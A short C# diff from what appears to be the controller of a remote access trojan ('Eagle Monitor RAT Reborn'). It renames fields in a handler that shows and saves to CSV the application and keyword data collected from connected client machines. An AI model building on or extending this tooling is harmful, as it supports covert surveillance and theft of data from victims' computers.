@@ -18,27 +18,27 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
             {
                 try
                 {
-                    if (ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView != null)
+                    if (ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientForm.keywordsDataGridView != null)
                     {
-                        ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.BeginInvoke((MethodInvoker)(() =>
+                        ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientForm.keywordsDataGridView.BeginInvoke((MethodInvoker)(() =>
                         {
-                            ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.Rows.Clear();
+                            ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientForm.keywordsDataGridView.Rows.Clear();
                             foreach (object[] str in keywordsPacket.keywordsList)
                             {
-                                int rowId = ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.Rows.Add();
-                                DataGridViewRow row = ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.Rows[rowId];
+                                int rowId = ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientForm.keywordsDataGridView.Rows.Add();
+                                DataGridViewRow row = ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientForm.keywordsDataGridView.Rows[rowId];
                                 row.Cells["Column26"].Value = str[0].ToString();
                                 row.Cells["Column27"].Value = str[1].ToString();
                             }
                             if (Program.settings.autoSaveRecovery)
-                                Utils.ToCSV(ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView, ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv");
+                                Utils.ToCSV(ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientForm.keywordsDataGridView, ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv");
                             return;
                         }));
                     }
                     else
-                    { Utils.ToCSV(keywordsPacket.keywordsList, ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
+                    { Utils.ToCSV(keywordsPacket.keywordsList, ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
                 }
-                catch { Utils.ToCSV(keywordsPacket.keywordsList, ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
+                catch { Utils.ToCSV(keywordsPacket.keywordsList, ClientHandler.ClientHandlersList[keywordsPacket.BaseIp].ClientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
             }
             else
                 return;
